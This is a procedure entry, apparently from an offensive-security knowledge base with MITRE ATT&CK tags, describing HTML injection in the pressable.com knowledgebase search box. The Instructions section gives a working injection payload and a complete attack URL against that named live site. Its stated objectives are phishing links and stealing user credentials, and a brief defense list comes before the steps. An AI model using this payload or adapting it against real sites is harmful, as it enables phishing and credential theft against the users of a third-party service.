---
id: proc-html-phish-pressable
tags:
  - html-injection
  - phishing
  - arbitrary-html
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[T1566.002]]'
updated_at: '2025-12-13T23:52:55.019Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[T1566.002]]'
---
---

# Inject-HTML-for-Phishing-in-Search-Box

## Summary

This procedure exploits HTML injection in the pressable.com knowledgebase search box to render arbitrary HTML elements, such as styled links that could phishing users to malicious sites and steal credentials.

## Description

Due to lack of HTML escaping, the ?s= parameter reflects raw input, allowing tags and attributes to be parsed by the browser. In an attack, this could overlay fake content on legitimate pages to trick users into clicking malicious links.

## Requirements

1. Web browser capable of rendering HTML
2. Public access to the target site
3. Knowledge of target phishing domain

## Defense

Defensive measures and detection strategies:

- Escape HTML entities in all output contexts (e.g., &lt; for <)
- Validate and sanitize input to allow only alphanumeric characters
- Log and alert on unusual HTML patterns in search queries

## Objectives

1. Render custom HTML on the page
2. Create phishing links to external malicious sites
3. Compromise user credentials via social engineering

## Instructions

### Step 1: Craft and Inject HTML Payload

**Context**: Design HTML that includes styling and links to simulate a phishing lure.

Enter the following payload into the search box:

<h1><font Color=red>Visit Our New WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>

URL: https://pressable.com/knowledgebase/?s=<h1><font Color=red>Visit Our New WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>&post_type=knowledgebase

Submit the form.

> This injects a red heading and highlighted link, rendered as interactive HTML.

### Step 2: Verify Rendering

**Context**: Check that the HTML is parsed and visible to users.

View the search results page and interact with the injected elements.

> Expected: Styled text and clickable link appear, potentially deceiving users.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[T1566.002]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[html-injection]]
- [[Phishing]]
- [[web-vulnerability]]
